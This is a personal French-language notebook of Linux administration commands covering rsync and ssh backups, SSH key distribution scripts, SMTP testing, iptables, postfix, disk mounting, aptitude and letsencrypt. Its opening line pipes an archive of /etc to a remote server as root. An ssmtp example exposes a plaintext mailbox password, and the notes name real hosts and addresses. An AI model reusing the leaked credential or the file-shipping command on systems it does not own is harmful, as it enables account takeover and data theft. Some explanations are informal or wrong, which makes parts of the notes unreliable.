  tar cvzf - /etc | ssh root@lautreserveur.com -p2222 "cat >>/data/home/lduverge/etc.gz" //tar le repertoire etc et met le dans lautreserveur dans le repertoire data/... etc.gz: besoin connexion par cle peut etre pour que mot de passe n'empeche pas la connection.
  pour distribuer automatiquement mes cles publics vers d'autres serveurs
  LINK9939572 2 scripts à ecrire. Le 1er appelle le 2e.
                 executer le script comme ça :  scripts/promotePublicKey.sh .ssh/id_rsa.pub
                 voici les scripts ci-dessous à creer d'abord
                  1.
                    promotePublicKey.sh
                        #! /bin/bash
                        # Author: Eddie Webb - edwardawebb.com
                        # Deploys a public SSH key to multiple remote nodes. It will convert from Putty Format
                        # Then calls Script:
                        #	addPublicKeyRemotely.sh
                        ## Check arghuments
                        if [ $# -ne 1 ]
                        then
                        	printf "Usage: \n %s PuttyPubKey\n\n" `basename $0`
                        fi
                        #create a log file
                        LOGFILE=Results.log
                        SERVERS=( nomOuIpserver1 nomOuIpserver2.etc.. )
                        #NOte: if your username is different on each node - make an array below that correspoinds to the node list above
                        USER=YOUREMOTEUSERNAME
                        SSHKEY=$1
                        SSHKEYBASE=`basename $1`
                        SCRIPTPATH=`dirname $0`
                        ## loop thorugh all servers sending key and remote script - purges afer script runs.
                        for (( i = 0 ; i < ${#SERVERS[@]} ; i++ ))
                        do
                        	echo Sending to Host ${SERVERS[$i]}
                        	echo ExecuteCommandeScp $SSHKEY $SCRIPTPATH/addPublicKeyRemotely.sh $USER@${SERVERS[$i]}:~/
                        	scp $SSHKEY $SCRIPTPATH/addPublicKeyRemotely.sh $USER@${SERVERS[$i]}:~/
                        	ssh $USER@${SERVERS[$i]} "~/addPublicKeyRemotely.sh $SSHKEYBASE;rm -f ~/addPublicKeyRemotely.sh" >> $LOGFILE
                        	if [ $? -eq 0 ]
                        	then
                        		echo Key successfully pushed to ${SERVERS[$i]} >> $LOGFILE
                        		echo SUCCESS
                        	else
                        		echo FAILED pushing key to ${SERVERS[$i]} >> $LOGFILE
                        		echo FAILED
                        	fi
                        	printf "\n\n\n"
                        done
                  2.
                    addPublicKeyRemotely.sh      
                      #!/bin/bash
                      # Author: Eddie Webb - edwardawebb.com
                      # Called by Script:
                      #		promotePublicKey.sh
                      # Arguments:
                      #		name of converted SSH key 
                      # this file is uplaoded to remote serveres and called to handle remote work before being deleted.
                      	if [ ! -d .ssh ]
                      	then
                      		mkdir -p .ssh
                      	fi
                      	touch .ssh/authorized_keys
                      	chmod 0600 .ssh/authorized_keys
                      	cat $1 >> .ssh/authorized_keys
                      	rm -f $1
tester que le serveur de mail marche bien
1)  recuperer ssmtp sur aptitude (il est obsolete: utiliser msmtp)
      ssmtp -C youmouve.conf contact@youmouve.com < youmouve.txt
      ou 
      youmouve.conf: 
          mailhub=smtp.youmouve.com:25
          AuthUser=contact@youmouve.com
          AuthPass=YANNICK94
      youmouve.txt:
          To: kanailaurent@gmail.com
          From: contact@youmouve.com
          Subject: Sent using the SMTP-server of GMail
          Some content.
copy Ctlr+ins ; paste Shift+ins
2)
saisir les commandes suivantes pour commander le serveur smtp (pas reçu le mail pourtant....)
          www-data@kanail:~$ telnet localhost smtp
          Trying ::1...
          Connected to localhost.
          Escape character is '^]'.
          220 www.memoclap.com ESMTP Postfix (Ubuntu) // Sur ubuntu c'est postfix le serveur smtp par defaut
          EHLO www.mondomaine (www.memoclap.com) -> il dit alors ce qu'il est capable de faire. ou bien faire : HELO justtesting ? 
          MAIL FROM: <projet@memoclap.com>
          250 2.1.0 Ok
          RCPT TO:<kanailaurent@gmail.com>
          250 2.1.5 Ok
          DATA
          354 End data with <CR><LF>.<CR><LF>
          To: kanailaurent@gmail.com
          From:projet@memoclap.com
          Subject:testlaurent
          Date:Fri, 25 Jan 2019 09:04:30 -0400
          testlaurentbody
          QUIT

LINK984095 sur cygwin ou unix je peux lister trouver chercher tous les documents dans un repository svn en ligne de commande sans client: 
       svn list -R https://svn.ptx.fr.sopra/svnhrasvc/hrasvc > todelete.txt
         
  rechercher:
        grep chainedecaracteres nomfichier (echappement \ exemple : \.menu pour trouver la classe css menu)
        grep -l //pour seulement afficher le nom liste des fichiers contenant les caratères recherchés
      grep -i chainecaracteres nomfichier........... -i pour ignorer la case majuscule minuscule
      grep 'chainec ara cteres' nomfichier1 nomfichier2 nomfichier3 JE NE PENSE PAS QU ON EST BESOIN DE METTRE DES GUILLEMENTS
      grep inverse: -v
      grep 'chainecaracteres' * ... pour rechercher dans le repertoire en cours une chaine de caractere de maniere recursive
          grep -r 'chainecaracteres' * ... pour chercher dans le repertorie en recursif
          si ca ne marche pas on peut faire ca :
            find "$PWD" -name '*.fitreFichier' | xargs grep 'chainedecaractere' // attention la commande plante si je mets grep '-qqchose' (signe moins) possible echapper avec \
            ou
            find "$PWD" | xargs grep 'chainedecaractere'
            ou tous
            find . | xargs more
          avant:
            ls | xargs grep 'chainedecaracteres'
  pour executer une commande regulièrement : 
    watch -n NBSECONDESENTRECHAQUE MaCommande
    pour interrompre : Ctrl+c
  iptables : https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules 
            -t "table"(raw,mangle,nat,filter(par defaut)) -A "CHAINE" -p "protocole" --dport "port"
            1paquet arrive -->cable-->eth0
              -->raw PREROUTING (modif packets)
                -->mangle PREROUTING = modifier les packets ip (Type Of Service; time to live ; mark settings)
                  -->nat PREROUTING(est inclu dans Mangle) = traduction d'adressage: !!reroutage!!DNAT
                    -->mangle INPUT modifie packets après routage
                      -->filter INPUT filtrage du trafic
                        -->application-->resort---------->|
                        raw OUTPUT tra_age de connexion<--|
                  mangle OUTPUT Modification de packet<--
                nat OUTPUT !!rerouting!!<--
                        filter OUTPUT<--
            mangle POSTROUTING <--
              modif packets avant qu'il quit la machine
        nat POSTROUTING SNAT<--
      sort par ex par eth0<--
                  cable<--
      
            
quelle est la version processeur 
  cat /proc/cpuinfo
quel port est ecoute utilise utilise?
      netstat -a(all)n(afficher les liste des ports en numerique ou plutot les ip au lieu des hostnames)t(que les ports tcp) p(pour voir les idprocess en derniere colonne)
      netstat -ant
quels sont les fichiers ouverts? process sont utilisés lockes par qui?
      lsof -n(numerique)P -i(que les ports):8080
      lsof -nP -i:8080
    lsof | grep "data/srv" (recherce quel fichier sous data/srv est utilise par processus)    
postfix :
    pour savoir ou se trouve la conf de postfix :
          postconf config_directory
    possible modifier postfix/main.cf
    reloader la conf : 
        postfix reload
    voir la conf resultante :
        postconf -n 
    pour redemarrer le serveur Postfix :
        sudo /etc/init.d/postfix restart
        ou
        sudo service postfix restart
    pour stopper postfix: 
        postfix stop (je l'ai stoppé sur memoclap car je crois qu'il est hacké)
pour recuperer le nom du fichier batch execute sans son extension  : 
    BASENAME=$(basename $0 .sh) ou `basename /path/monfichier.toto // renvoit monfichier.toto 
                                    `basename /path/monfichier.toto .toto // renvoit monfichier 
decouper un gros fichier en plusieurs petits : 
csplit -k nom_de_mon_fichier.txt 200 {99}  // coupe toute les 200 lignes et nomme ces fichiers par defaut xx00, xx01 etc.. si on veut un autre nom mettre : 
csplit -k -f mon_prefix solido-log.txt 200 {99} on aura: mon_prefix00 etc... {99} je crois c pour qu'il divise en 99 fichier
csplit -k -f TODELETE BIRRLT 1000 {99}
tableaux:
    mon_tableau[0]="valeur 0" # je defini mon tableau
    echo ${mon_tableau[20]} # j'affiche l'element 20 de mon tableau
    parcourir mon tableau :
      for i in ${mon_tableau[@]}
        do
            echo $i
        done
effacer : 
  rm pour les fichiers et rm -r pour les repertoires en recursif mais si je ne veux effacer que les repertoires si ils sont vides : rmdir -v n'efface que les repertoires vides. -v pour verbose
  rm -i pour confirmer à chaque fois
  rm -r -i ...
connaitre la taille d'une chaine de caractères: 
      chaine_longueur=`echo $OBJECTID | wc -c` 
renommer rename un fichier : 
  mv toto.txt titi.txt
faire une addition :
  count=`expr $count + 1` ## respecter les espaces! sinon il concatene les chars 
parser du xml sous unix: 
      xmllint --xpath '//electronics/value/text()' second-xml_file.xml
              mon xml c'est: <adi><asset><electronics item="Mobile" name="Nokia" value="300$" /> etc...
        xmllint --xpath '//RN-CLIP-LAUNCH-ACTUATOR/ACTUATOR-CODE/text()' 090135f3800aef2f.xml
        xmllint --shell 090135f3800aef2f.xml                      
    http://xmlsoft.org/xmllint.html
    ftp://ftp.freefriends.org/arnold/Awkstuff/xmlparser.awk
Parcourir les lignes et colonnes d'un fichier csv :
for ligne in $(cat $EXPORT_DIR/DDD_ExportPHX_SIE_Versions_Eligibles_K1.csv) ## pacourrir lire read un fichier ligne par ligne
do
    OBJECTID=`echo $ligne | awk -F';' '{ print $2 }'` ## prendre deuxieme colonne
    echo $OBJECTID
done
ou bien : (plus vieille methode mais marche à tous les coups) 
      while read ligne ## on fait ca sur le fichier $CSV_IN
      do
      	if [ $i -gt 1 ]; then
      	    OBJECTID=`echo $ligne | nawk -F';' '{ gsub (/\"/, "", $2); print $2}'`
      	    echo $i ":" $OBJECTID
      	    // une commande : MyExportSIE $OBJECTID xml $FicSRC #ecrit dans /data/documentum/applications/a_ddd/ExportPHX/tmp
      	fi
      	i=`expr $i + 1`
      done < $CSV_IN

les emails sont sur : 
    /var/mail
si j'ai le message : bad interpreter
    c parce que mes fichiers ont ete ecrits sous windows: les reecrire sous vi: (possibilite faire copier colle dans vi) (dos2unix)
compter le nombre de fichiers dans un repertoire :
  ls -al | wc -l (wc -l compte le nombre de lignes)

clear de l'ecran 
    clear ou Ctrl+l
a faire: verifier que la declaration des paths se fait dans le fichier bashsrc ou un truc pareil
rsync :
    pour faire une syncrho: comme une copie 
        rsync -avrun /var/www/ /srv/data/var/www/ //n pour tester
    rsync -avrun (archive verbose update_cad n'efface pas les plus recents sur la destination n pour faire juste un test /mon/repertoireSource/ monServeurDestinataire:/monRepertoire/Destinataire (NE PAS mettre / ni /* à la fin de dest sinon il syncrho pas tout) (le slash après le source folder c pour dire de ne pas copier le dernier folder dans dest sinon il mettra repertoireSOurce dans Destinataire
    rsync -vru --list-only --exclude 'sarge' --exclude 'theatre' /cygdrive/c/Users/Laurent/Documents/documents/ /cygdrive/e/Mesdocuments
    --list-only  il ne fait meme pas un n mais il affiche juste (n il fait une simulation) ATTENTION JE CROIS QUIL NE DIT PAS TOUJOURS VRAI MIEUX VAUT UTILISER -n 
    --ignore-existing pour ne rajouter que les orphelins a gauche.
    -a archive: copie les permissions // attention ne jamais mettre ca dans windows sinon ailleurs pourrais pas ouvrir le fichier peut etre
    --exclude 'un/path ou nomrepertoire'
    -v verbose
    -r c pour recursive
    -u ne pas mettre à jour les fichiers de destination à la meme date ou plus recents
     -n pour tester, mettre "n". exemple vrun ou avun
    Exemple local :
        j'utilise ca :
                   Vers TERA  
                      rsync -vru /cygdrive/c/Users/Laurent/Documents/documents/ /cygdrive/f/Mesdocuments // va mettre documents SOUS Mesdocuments
                      (le slash après le source folder c pour dire de ne pas copier le dernier folder dans dest sinon il mettra documents dans Mesdocumentss 
                      rsync -vru --exclude 'target' --exclude 'Test' --exclude '.metadata' --exclude '.settings' --exclude 'sons' --exclude 'temp' --exclude '*.log*' --exclude 'gen' --exclude 'bin' --exclude '*.jar' --exclude 'mmcl' --exclude '*.mp4' --exclude '*.ogv' --exclude '*.webm' --exclude 'Mbrola' /cygdrive/c/wamp/www/ /cygdrive/f/www
                      rsync -vru  /cygdrive/c/Users/Laurent/AndroidStudioProjects /cygdrive/f/AndroidStudio4
                      rsync -vru --exclude '.metadata' --exclude 'target' /cygdrive/c/Users/Laurent/Documents/workspaceJava8/ /cygdrive/f/workspaceJava8
                  Du server (tout vers F)
>CELUI LA A FAIRE>>>serve03      rsync -avur --exclude proc --exclude tmp --exclude sys --exclude www.wenhuaduverge.comOLD --exclude www.wenhuaduverge.comORIGIN --exclude .git root@www.wenhuaduverge.com:/ /cygdrive/f/BackupServer03_20171126
>CELUI LA A FAIRE>>>serve03      rsync -avurn --exclude .git root@www.wenhuaduverge.com:/srv/datadisk03/www/www.wenhuaduverge.com /cygdrive/f/BackupServer03_20171126/srv/datadisk03/www
>CELUI LA A FAIRE>>>demeter      rsync -vru root@95.142.162.203:/var/www/www.memoclap.com /cygdrive/d/backupsDemeterMemOclap
>CELUI LA A FAIRE>>>demeter      rsync -vru --exclude 'sons' --exclude 'www.wenhuaduverge.com' --exclude 'var/tmp/php' --exclude '*jar' root@95.142.142.203:/ /cygdrive/f/backupsDemeter/BackupServeurGandiDemeter20171229
                    demetersuite rsync -vru --exclude 'sons' --exclude 'www.wenhuaduverge.com' --exclude 'var/tmp/php' --exclude '*jar' root@95.142.142.203:/srv/data/var/www /cygdrive/f/backupsDemeter/BackupServeurGandiDemeter20171229/srv/data/var/www
                  Du Serveur Wenhuaduverge/shop vers F:backupwenhuaduverge (besoin installer cygwin avec ssh) (mettre ma cles cles privee sous /repertoireHomeDuUser/.ssh/id_rsa qui est un fichier texte dans lequel j'ecris ma cle privee. je déposerais la cle publique sur le serveur)
                      rsync -avu www-data@www.wenhuaduverge.com:/home/www-data/wenhuaduverge/ /cygdrive/f/backupwenhuaduverge20170612
                      sauf images :
                      rsync -avu  --exclude '*.jpg' --exclude '*.png' --exclude '*.gif' --exclude '*.pdf' www-data@www.wenhuaduverge.com:/home/www-data/wenhuaduverge/ /cygdrive/f/backupwenhuaduverge20170612AfterUpd
                  De local vers serveur                      
                      rsync --ignore-existing -avunr /cygdrive/f/BackupServeurGandiDemeter2/srv/data/var/www/www.wenhuaduverge.com www-data@www.wenhuaduverge.com:/srv/data/var/www/www.wenhuaduverge.com
                  rsync -avu --exclude sons --exclude proc --exclude tmp root@www.wenhuaduverge.com:/srv/data /cygdrive/f/BackupServeurGandiDemeterCASSE/srv/data                                                                                                                                                                                                                                                                                                                                                 
                    Vers Doroty
                    rsync -vr /cygdrive/f/Mesdocuments/ /cygdrive/e/documents/
                      rsync -vr --exclude 'PHOTOS' --exclude 'Karie' --exclude 'theatre' --exclude 'icecream' --exclude 'avance services' --exclude 'AUDIOLOOPPLUS2' --exclude 'AUDIOLOOPPLUS' --exclude 'AH1*' --exclude 'PE1*' --exclude 'ImagesPhotos' --exclude '*.avi' --exclude '*.MOD'  --exclude 'Cakewalk*' /cygdrive/f/Mesdocuments/ /cygdrive/e/documents
                      rsync -vr --exclude 'testcubase' --exclude '*.au' /cygdrive/f/MaMusique/ /cygdrive/e/Mamusique 
                    sauvegarde de wenhua
                      rsync -vru --exclude 'default-bootstrap' --exclude 'prestashop' --exclude 'prestashopINUTILE' --exclude 'themeconfiguratorINUTILE' --exclude 'wpzoom' --exclude 'zoom' --exclude 'themeconfigurator' --exclude '.htaccess' --exclude 'Install_PrestaShop.html' /cygdrive/f/www/WenhuaDuvergeShop/toutNEW /cygdrive/e/www/WenhuaDuvergeShop/WenhuaDuvergeShop/toutNEW
                      rsync -vru --exclude 'default-bootstrap' --exclude 'prestashop' --exclude 'prestashopINUTILE' --exclude 'themeconfiguratorINUTILE' --exclude 'wpzoom' --exclude 'zoom' --exclude 'themeconfigurator' --exclude '.htaccess' --exclude 'Install_PrestaShop.html' /cygdrive/f/www/WenhuaDuvergeShop /cygdrive/e/www/WenhuaDuvergeShop
                      rsync -vrun --exclude 'target' --exclude 'Test' --exclude '.metadata' --exclude '.settings' --exclude 'sons' --exclude 'temp' --exclude '*.log*' --exclude 'gen' --exclude 'bin' --exclude '*.jar' --exclude 'mmcl' --exclude 'Mbrola' /cygdrive/c/wamp/www/ /cygdrive/e/DisqueDurC/www
                  pour supprimer les orphans orphelins qui sont sur la dest : 
                        rsync -av --exclude=neffaceJAMAIScesOrphansLà --delete www-data@www.wenhuaduverge.com:/home/www-data/wenhuaduverge/ /cygdrive/f/backupwenhuaduverge0
apparmor : limite les accès des programmes à des fichiers
    sudo aa-complain /usr/sbin/mysqld // si apparmor n'utorise pas à mysql des acces, autorise qd meme et log les pb   besoin installer apparmor-util avec aptitude
    sudo aa-enforce /usr/sbin/mysqld // à l'inverse applique les restrictions.
    sudo invoke-rc.d apparmor reload // recharge apparmor. a faire si j'ai modifie les fichiers de conf de apparmor
    sudo systemctl restart apparmor  // recharge apparmor. a faire si j'ai modifie les fichiers de conf de apparmor
                      
Les levels: 0 eteint,  1  console de secour, 2 console sans reseau,3 avec reseau ... 
trouver ou se trouver un programme: (besoin de "locate :") (la nouvelle version c'est mlocate  ça marche.)
   installer locate par aptitude si il n'exite pas, 
   Faire updatedb pour mettre à jour la base de donnee de locate 
   puis locate jetty (par exemple)
pour voir les disques (les montages les partitions) 
  fdisk -l
    df -h
pour voir les partitions : 
  more /proc/partitions
montage des disques parametres au lancement sur (ou à une commande mount avec un seul argument : partition ou repertoire)  
/etc/fstab
    cat /etc/fstab
      c'est là qu'on declare les montages et lorsqu'on reboot ce fichier est lu pour remonter le volume dans l'arborescence du sys de fichier
      on y voit quelquechose comme :

        periferiques peripheriques (pour les voir faire la commande : lsblk ou lspci)
        Les disques(la partition)   les chemins       mettre_ext3     mettre_defaults
        /dev/xvda1                    /                 ext3            rw,noatime,errors=remount-ro  0    1
        devpts                        /dev/pts          devpts          defaults      0 0
        none                          /proc             proc            rw,nosuid,noexec  0    0
        /dev/xvdb                      /srv/backup      ext3            defaults          0    2
              donc tout ce qui est sous /blabla/blibi va etre dans le disque /dev/xdva1 sauf /srv/backup, /proc et /dev/pts
  pour demonter un disque, remonter : 
    umount nom_de_mon_volume_a_demonter (pas sur pour le parametre)    ou bien umount systeme/de/fichier
    umount /srv/backup ou umount /dev/xvdb              
  Donc quand je vais monter un disque en ecrivant : 
      mount /dev/xvdb: automatiquement il va le monter sur /srv/backup
      EXEMPLE 1 :si je fais ça : 
      mount /dev/xvdb /un/repertoie
      puis
      mount /dev/xvdb /un/autre/repertoire
      ALORS ce qui a sous /un/repertoire ET /un/autre/repertoire C'EST EXACTEMENT LA MEME CHOSE (ça ne sert à rien mais c pour l'exemple)
      EXEMPLE 2 : 
        mkdir srv2 (je fais ça a la racine)
        mount /dev/xvdb /srv2 Dès lors tout ce qu'il y avait dans le disque /dev/xvdb va etre sous /srv2              
        /srv2/var et /srv2/www vont exister!
       ensuite...
       mkdir srv3
       mount /dev/xvdb /srv3   alors svr3 et svr2 contiennent LA MEME CHOSE
       umount /srv3 srv3 ne contient plus rien
       umount /srv2 srv2 ne contient plus rien on peut effacer ces deux repertoires
       rmdir srv2, rmdir srv3
       
       
       
       
changer la taille d'une partition: 
  sur l'interface utilisateur Gandi, changer la taille.
  attache (sur gandi)
  puis
  demonter la partition. (umount) (sur gandi il faut aussi peut etre même la detacher dans l'interface utilisateur)
  puis sur gandi:
  detacher, changer de nom puis rattacher. 
verifier que mon systeme de disque est OK
    e2fsck -f /dev/xvdb
    ou  
    fsck /dev/xvdb (ATTENTION demonter avant!!!) -> meme si j'ai e2fsck: Ne peut continuer, arrêt immédiat... continuer ci dessous
  remonter le disk: mount /dev/xvdb
  puis
  resize2fs /dev/xvdb (ma partition)
  puis fdisk -l pour verifier que la taille a bien ete modifiee 
    
    
           attache
       demonte, (je suis sur que sys ne peut pas ecrire dessus) 
       resize
condition: 
  if [-z bla] //si bla=null return true.
compter le nombre de fichiers dans un repertoire :
  ls -al | wc -l (wc -l compte le nombre de lignes)
pour savoir en quoi est code un .exe :
    less nom_de_l'exe"
      et en entete du fichier on voit :
      ELF
      ca ca veut dire que c'est un executable linux
      ensuite a la fin de l'executable on voit: GCC
      c'est le compilateur C linux
      donc ca doit être du C ou du C++
raid :
    raid0: j'ai plusieurs disque mais une seule interface et je crois avoir qu'un seul disque. Si un disque pete je perds tout.
    raid1: j'ai plusieurs disques et l'info est dupliquée entre les deux
    raid1.0 ou 0.1 : j'ai au moins 4 disques 2 dupliqués à 2 et une paire correspond pour moi a un seul disque.
lvm :
    equivalent de git avec des snapshots mais pour les disques unix    
ksh :      
pour faire une pause dans un script ksh:
      read -p "Press [Enter] key to start backup..."
pour faire un prompt dans un script ksh:
    
    ou bien 
       read -p "Pret? " -n 1 -r # -n nombre de caractères que l'utiliseur doit saisir; -r pour echaper les \; -p: le message
        if [[ $REPLY =~ ^[Yy]$ ]] # on a ecrit Y ou y
        then
                chmod -R 775 $Version
                cd ..
                ./Bind*
                ./Update*
        fi
conditions : 
            if [ -z $REPLY ] // si $REPLY est vide 
            if [ !-z $REPLY ] pour l'inverse
si j'ai ': not a valid identifier c'est parce que mon fichier de script est en mode windows avec des retours chario CR au lieu de LF.                             
pour faire une methode dans un ksh :
      MaMethode ()
      {
        (...)
      	return 0
      }
pour faire un include importer d'un autre ksh dans un ksh
    . $path_vers_mon_autre_ksh/DDD_ExportPHX_environnement.ksh
pour faire un substring : 
    NOM_FICH_PAYS=$DATE_ENTREE`echo $ligneLu | cut -d":" -f 2`
    qui signifie :
    ma_variable =$uneautrevariableConcateneeAvec`echo $uneVariableQuiVaEtreSubstringuee | cut -d"monDelimiteur" -f NombreDeCharApresDelimiteur`
pour savoir quel process tourne sur un fichier en particulier :
    fuser 
pour trouver php.ini
  c mieux de faire un fichier avec dedans 
                  <?php
                // Affiche toutes les informations, comme le ferait INFO_ALL
                phpinfo();
                // Affiche uniquement le module d'information.
                // phpinfo(8) fournirait les mêmes informations.
                phpinfo(INFO_MODULES);
                ?>
                et afficher ce fichier dans un browser
  faire php -help: il ya une commande qui permet de dire ou est php.ini.
    exemple php --ini
pour arreter redemarrer mysql voir LINKmysql9938 
    
pour installer des programmes: applications: (le repository miroir est je crois sources.list) (le repository miroir est je crois sources.list)
    avec apt : apt-get : (sinon il ya aussi la commande yum)
      apt-get update // pour mettre a jour la liste des packages nouvellement installables c a d juste la liste.
    pour installer ksh sur Debian:
      sudo apt-get install ksh pdksh         Linkkshsflk
    pour desinstaller
      sudo apt-get --purge remove nomprogramme
    pour savoir quel language utilise un utilisateur
        grep "^utilisateur" /etc/passwd
    pour basculer le user en cours en ksh 
        chsh -s /bin/ksh
   installer avec aptitude :
        installer aptitude
            apt-get update  (apt-get upgrade si suffit pas pour la commande suivante)
            apt-get install aptitude
      sudo aptitude
      Ctrl+t ou F10 pour acceder au menu et utiliser aptitude. refaire Ctrl+t pour fermer le menu
      les touches 'haut', 'bas', 'gauche', 'droite' pour naviguer.
      la touche 'entree' pour deplier/replier
      Ctrl+u undo annuler
      e si apptitude affiche un conflit appyer sur e pour voir plus de details et une solution proposee
      . pour voir la solution suivante proposee
      r pour rejetter/ne plus rejetter une solution
      ! ou a pour accepter une solution
      u met à jour la liste des paquets disponibles   // raffraichit en fait que la liste de ce qui peut etre MAJ
      U (marque tous les paquets susceptibles d'être mis à jour pour être mis à jour); 
      + pour selectionner un packet à installer/mettre à jour
      SI ca devient rouge : Rechercher > voir ce qui est casse   ou faire b
      - pour supprimer un paquet (NE JAMAIS FAIRE CA MAIS FAIRE  : )
      _ pour supprimer un paquet et ses fichiers de configuration
      g  pour voir une simulation et on peut modifier après si besoin, faire : par ex pour annuler un truc. refaire g pour confirmer definitivement
      : pour ne pas mettre à jour
      C : pour voir le descriptif detail de ce qui va changer  
      menu 'Actions' : 'Annuler les modifications en attente' revenir en arriere 
      q pour revenir retour en arrière vis a vis de g/pour quitter 
      lexique : 
          i	 le paquet est installe et toutes ses dependances sont satisfaites
          c	 le paquet a ete supprime mais ses fichiers de configuration sont toujours presents sur le système
          d  le paquet va etre supprimé (mais pas sa conf)
          p	 le paquet et tous ses fichiers de configuration ont ete supprimes, ou le paquet n'a jamais ete installe
          v	 le paquet est virtuel
          B	 le paquet a des dependances cassees. Faire Undo dans ce cas
          A	 le paquet a ete automatiquement installe
          u  unpacked
si j'ai cette erreur avec aptitude ou apt-get update :
    W: Aucune clÃ© publique n'est disponible pour la/les clÃ©(s) suivante(s)Â :
    D9A579D6BB859933
         Solution1:
         apt-get install debian-archive-keyring
         KO pour moi...
         Solution2
         apt-get install gnupg
         gpg --keyserver hkp://wwwkeys.eu.pgp.net --recv-keys <votre cle>
         exemple
         gpg --keyserver hkp://wwwkeys.eu.pgp.net --recv-keys D9A579D6BB859933
         ou
         gpg --keyserver keyring.debian.org --recv-keys D9A579D6BB859933
         ou
         gpg --keyserver hkp://wwwkeys.pgp.net --recv-keys D9A579D6BB859933  >>> c ca qui a fonctionne
         ou
         gpg --keyserver mirrors.gandi.net --recv-keys D9A579D6BB859933
    
         puis l'integrer à apt:
         gpg --armor --export <votre cle> | apt-key add -
         ex
         gpg --armor --export D9A579D6BB859933 | apt-key add -



Quand vous regardez les actions en attente :
'a' accepte explicitement une action (retapez 'a' pour refuser l'action)
'r' rejette une action
en tapant 'g' à nouveau, on reprend la liste des actions en attente.
          
iptables : pour configurer le firewall netfilte de unix
  bonne pratique securite:avec iptable fermer tous les ports non utilises et laisser ouvert que les ports utiles et se proteger de nmap:https://nmap.org/misc/defeat-nmap-osdetect.html
  afficher la liste des regles: 
      sudo iptables -L
  supprimer la ligne numero 7 de ce qui a ete affiche
        iptables -D INPUT 7      (ca commence par 1)
  ajouter l'acceptation du port 3306: 
      iptables -I INPUT -p tcp -i eth0 --dport 3306 -j ACCEPT (-A pour add à la fin de la liste. Si on veut inserrer on met -I)
  sauver les regles:
      sudo -s iptables-save -c
letsencrypt :
      les logs sont sous /var/log/letsencrypt/letsencrypt.log
      les confs de renew sont sous /etc/letsencrypt/renewal
      ou sous 
      si il dit que le serveur n'est pas securise alors que les certifs sont a jour, redemarrer apache
           pour renouveler tout auto regarder script du crontab c plus rapide.
      si Error: couldn't get currently installed version for /opt/eff.org/certbot/venv/bin/letsencrypt:
          faire :rm -rf /opt/eff.org
      server03: >>>MAINTENANT: methode http-01 qui est supportée: certbot --webroot certonly -d kanail.net -d www.kanail.net
                >>>>AVANT: methode tls-sni-01 qui n'est plus acceptee : certbot --apache certonly -d www.kanail.net (certonly:install le certif mais c a moi de config apache. Il ma de changé le path du certificat de /etc/letsencrypt/live/kanail.net/ vers /etc/letsencrypt/live/www.kanail.net/) donc j'ai du modifier ce path dans la conf apache.    
      demeter:  sous /opt/letsencrypt
       ./letsencrypt-auto renew
       ./letsencrypt-auto --apache -d kanail.net -d www.kanail.net //--renew-by-default  pour renouveler auto mais il posera la question si on ne le met pas
             pour renouveler automatiquement on va faire ça dans la crontab
                       30 2 * * 1 /opt/letsencrypt/letsencrypt-auto renew >> /var/log/le-renew.log
      ./letsencrypt-auto certonly --webroot -w /var/www/www.kanail.net -d kanail.net -d www.kanail.net
     ./letsencrypt-auto certonly --webroot -w /var/www/www.memoclap.com -d www.memoclap.com // sur demeter pour memoclap probablement faire pareille pour wenhuaduverge          
      il cree tout sous : /etc/letsencrypt/live/...
      pour reactualiser mes certificats le plus simple c de faire
      sous opt/letsencrypt
      ./letsencrypt-auto renew    
       pour verifier le nombre de jours restant expiration certificat:
          ./etc/letsencrypt j'ai cree des scripts qui contiennent : 
                    cert="/etc/letsencrypt/live/monsite.com/cert.pem"
                      echo " "
                      echo "############"
                      if openssl x509 -checkend 86400 -noout -in $cert
                      then
                        echo "The certificate $cert is good for at least another day!"
                        today=`date +%D`
                        expiredate=`openssl x509 -enddate -noout -in $cert  | awk -F'=' '{print $2}'`
                        expdate="date +%D --date='$expiredate'"
                        ed=`eval $expdate`
                        daysleft=`echo $(($(($(date -u -d "$ed" "+%s") - $(date -u -d "$today" "+%s"))) / 86400))`
                        echo "        Today's date: $today , expiring on: $ed , $daysleft days left to go."
                      else
                        echo "The certificate $cert has expired or will do so within 24 hours!"
                        echo "(or is invalid/not found)"
                      fi
                      echo "############"
                      echo " "   
pour recuperer telecharger uploader directement java: installer updater programme voir aussi curl 
      wget http://javadl.sun.com/webapps/download/AutoDL?BundleId=59621 -O jre-6u31-linux-i586.bin
      wget http://javadl.sun.com/webapps/download/AutoDL?BundleId=63202 -O jre-7u4-linux-i586.tar.gz
      wget http://javadl.sun.com/webapps/download/AutoDL?BundleId=63202 -O jdk-8u101-linux-x64.tar.gz
pour savoir quel type de langage est utilise:
  echo $SHELL 
  si il met bin/bash c'est du CSH pas du KSH. voir plus haut pour installer KSH et quoi mettre en debut de script Linkkshsflk  
pour savoir en quoi est code un .exe :
    less nom_de_l'exe"
      et en entete du fichier on voit :
      ELF
      ca ca veut dire que c'est un executable linux
      ensuite a la fin de l'executable on voit: GCC
      c'est le compilateur C linux
      donc ca doit être du C ou du C++
si lors de l'execution dun sh qui appelle un src qui appelle un sql j'ai "invalid filename" ou fichier introuvable
  c'est peut etre a cause du bom (pas sur) reprendre des fichiers qui marchent...
  sinon c juste qu'il y a des caractères chelous: reecrire ce fichier.
pour executer un script en mode debug: 
      sh -x monscript.sh
Pour creer un nouveau fichier vide : 
    >>monfichier.log ou plutot > mon fichier.log (>ecrase effacer et ecrit; >> ecrit a la suite)
env pour voir les variables d'environnement
pour seter setter les variable d'environnement sur unix linux
      sur unbuntu si c une nouvelle variable: 
        export MA_VAR=toto
      si on edite une variable existante : 
        MA_VAR=titi
      mais ca ca ne marche que pour la session du moment. Pour que ca persiste il faut editer sous 
      $HOME/.profile ou ~/.bash_profile ou /etc/profile   mettre aussi si besion export PATH=.:unpath:$PATH (Je peux le creer si il n'existe pas LINKç'(ç')
      et recharger avec source pathdufichierquonvientdemodifier 
      exemple pour charger:LINKç'(ç')
              if [ -f ~/.bash_aliases ]; then
                . ~/.bash_aliases
              fi

    
dans /usr/bin noramlement (on peut retrouver dans les variables d'environnement) on voit tous les programmes que le user peut utiliser (.exe) (les commandes)
pour voir la liste des alias, tapper alias (permet de voir les raccourcis de commandes)
pour voir le detail d'un alias : alias nomalias
pour faire des alias persistants : 
  vi ~/.bash_alias (ce dernier est charge par ~/.bashrc qui contient) LINKç'(ç')
      alias gototemplate='cd /var/www/www.wenhuaduverge.com/shop/themes/wenhuaduvergetheme/'
      alias gotocss='cd /var/www/www.wenhuaduverge.com/shop/themes/wenhuaduvergetheme/css'
